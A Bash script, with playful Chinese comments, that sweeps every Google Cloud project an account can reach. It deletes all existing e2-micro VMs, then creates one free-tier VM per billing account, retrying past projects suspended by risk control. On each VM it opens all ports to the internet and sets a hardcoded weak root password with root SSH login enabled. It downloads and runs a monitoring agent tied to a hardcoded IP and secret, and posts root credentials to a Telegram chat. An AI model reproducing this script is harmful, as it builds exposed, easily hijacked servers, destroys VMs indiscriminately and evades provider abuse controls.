#!/bin/bash
# ==========================================
# 喵酱的 GCP 大清洗 + 结算账户内全项目穷举 + TG通知脚本 🐾
# ==========================================

export CLOUDSDK_CORE_DISABLE_PROMPTS=1

ZONE="us-west1-a" 
MACHINE_TYPE="e2-micro" 
IMAGE_FAMILY="debian-12"
IMAGE_PROJECT="debian-cloud"
SSH_PASS="202825"
VM_NAME="free-tier-vm"

# Telegram 配置
TG_TOKEN=""
TG_CHAT_ID="7034468156"
TG_API="https://api.telegram.org"

send_tg_msg() {
    local text="$1"
    curl -s -X POST "${TG_API}/bot${TG_TOKEN}/sendMessage" \
        --data-urlencode "chat_id=${TG_CHAT_ID}" \
        --data-urlencode "text=${text}" \
        --data-urlencode "parse_mode=HTML" > /dev/null
}

echo "🐾 喵酱启动【活结算穷举突破模式】喵！"
PROJECTS=$(gcloud projects list --format="value(projectId)")

if [ -z "$PROJECTS" ]; then
    echo "❌ 无法获取项目列表喵！请检查授权。"
    exit 1
fi

# ==========================================
# 第一阶段：无差别清洗所有现存的免费机器
# ==========================================
echo "======================================"
echo "🧹 第一阶段：全网搜寻并摧毁旧的免费机器..."
for PROJECT in $PROJECTS; do
    EXISTING_VMS=$(gcloud compute instances list --project="$PROJECT" --filter="machineType:e2-micro" --format="value(name,zone)" 2>/dev/null)
    
    if [ -n "$EXISTING_VMS" ]; then
        echo -e "$EXISTING_VMS" | while read VM_INFO; do
            NAME=$(echo "$VM_INFO" | awk '{print $1}')
            VM_ZONE=$(echo "$VM_INFO" | awk '{print $2}')
            if [ -n "$NAME" ]; then
                echo "  -> 💥 发现目标！正在摧毁项目 [$PROJECT] 中的 $NAME..."
                gcloud compute instances delete "$NAME" --project="$PROJECT" --zone="$VM_ZONE" --quiet
                echo "  -> ✅ 摧毁成功！"
            fi
        done
    fi
done

# ==========================================
# 第二阶段：穷举项目，直到该结算成功开出一台
# ==========================================
echo "======================================"
echo "🎲 第二阶段：探测健康项目，严格执行“一结算一机器”..."

# 记录哪些结算账户已经【成功】开出机器了
declare -A SUCCESSFUL_BILLING_ACCOUNTS
SUCCESS_PROJECTS=()

for PROJECT in $PROJECTS; do
    # 1. 获取当前项目的结算账户
    BILLING_ACCOUNT=$(gcloud beta billing projects describe "$PROJECT" --format="value(billingAccountName)" 2>/dev/null)
    
    if [ -z "$BILLING_ACCOUNT" ]; then
        continue
    fi

    # 2. 【核心判断】：如果这个结算账户已经成功开过机器了，才跳过
    if [ "${SUCCESSFUL_BILLING_ACCOUNTS[$BILLING_ACCOUNT]}" == "1" ]; then
        echo "  -> ⏭️ 结算账户 [$BILLING_ACCOUNT] 已经有成功的节点，跳过项目: $PROJECT 喵！"
        continue
    fi

    echo "  -> ⚙️ 结算账户 [$BILLING_ACCOUNT] 正在尝试项目: $PROJECT"
    
    echo "    🔌 正在激活 API..."
    gcloud services enable compute.googleapis.com --project="$PROJECT" --quiet >/dev/null 2>&1
    sleep 10 # 稍微等一下让 API 生效

    echo "    🚀 尝试创建机器..."
    if ! gcloud compute instances create "$VM_NAME" \
        --project="$PROJECT" \
        --zone="$ZONE" \
        --machine-type="$MACHINE_TYPE" \
        --image-family="$IMAGE_FAMILY" \
        --image-project="$IMAGE_PROJECT" \
        --network-tier=PREMIUM \
        --tags=allow-all-ingress \
        --quiet; then
        echo "    ❌ 机器创建失败 (可能该项目被风控被 Suspended)。喵酱会继续尝试该结算下的其他项目喵..."
        continue # 失败了没关系，直接 continue，结算账户不会被锁定！
    fi

    # ==============================
    # 如果代码走到这里，说明机器创建成功了！
    # ==============================
    echo "    ✨ 机器创建成功！锁定该结算账户喵！"
    SUCCESSFUL_BILLING_ACCOUNTS[$BILLING_ACCOUNT]="1" # 正式锁定该结算，防止扣费

    echo "    ⏳ 等待机器苏醒 (20 秒)..."
    sleep 20

    # 开放防火墙
    gcloud compute firewall-rules create allow-all-ingress-custom \
        --project="$PROJECT" \
        --direction=INGRESS \
        --priority=1000 \
        --network=default \
        --action=ALLOW \
        --rules=all \
        --source-ranges=0.0.0.0/0 \
        --target-tags=allow-all-ingress \
        --quiet >/dev/null 2>&1 || true

    IP=$(gcloud compute instances describe "$VM_NAME" --project="$PROJECT" --zone="$ZONE" --format="value(networkInterfaces[0].accessConfigs[0].natIP)")

    # 远程配置环境与探针
    echo "    🔧 正在配置环境与探针..."
    cat << 'EOF' > remote_setup_$PROJECT.sh
#!/bin/bash
sed -i 's/deb.debian.org/mirrors.mit.edu/g' /etc/apt/sources.list.d/debian.sources 2>/dev/null || true
apt-get update -y
apt-get install -y unzip curl wget
echo "root:202825" | chpasswd
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
systemctl restart ssh || systemctl restart sshd

curl -L https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.sh -o agent.sh
chmod +x agent.sh
env NZ_SERVER=45.142.166.116:8008 NZ_TLS=false NZ_CLIENT_SECRET=EyxBehjdWpW3hnrzXavynrDIsGjWzKRH ./agent.sh
EOF

    gcloud compute ssh "$VM_NAME" --zone="$ZONE" --project="$PROJECT" --command="sudo bash -s" < remote_setup_$PROJECT.sh --quiet
    rm -f remote_setup_$PROJECT.sh

    echo "    ✅ 部署成功喵！正在推送到 Telegram..."
    
    TG_MSG="🐾 <b>喵酱汇报：新免费节点上线！</b>
项目：<code>${PROJECT}</code>
IP：<code>${IP}</code>
账号：<code>root</code>
密码：<code>${SSH_PASS}</code>"
    
    send_tg_msg "$TG_MSG"

    SUCCESS_PROJECTS+=("🐾 IP: $IP | 项目: $PROJECT | 结算: $BILLING_ACCOUNT")
done

echo -e "\n======================================"
if [ ${#SUCCESS_PROJECTS[@]} -eq 0 ]; then
    echo "❌ 报告主人，所有结算账户下的所有项目都试过了，全部阵亡喵..."
else
    echo "🎉 完美收工！本次成功穷举出底线的机器汇总："
    for RES in "${SUCCESS_PROJECTS[@]}"; do
        echo "$RES"
    done
fi
echo "======================================"
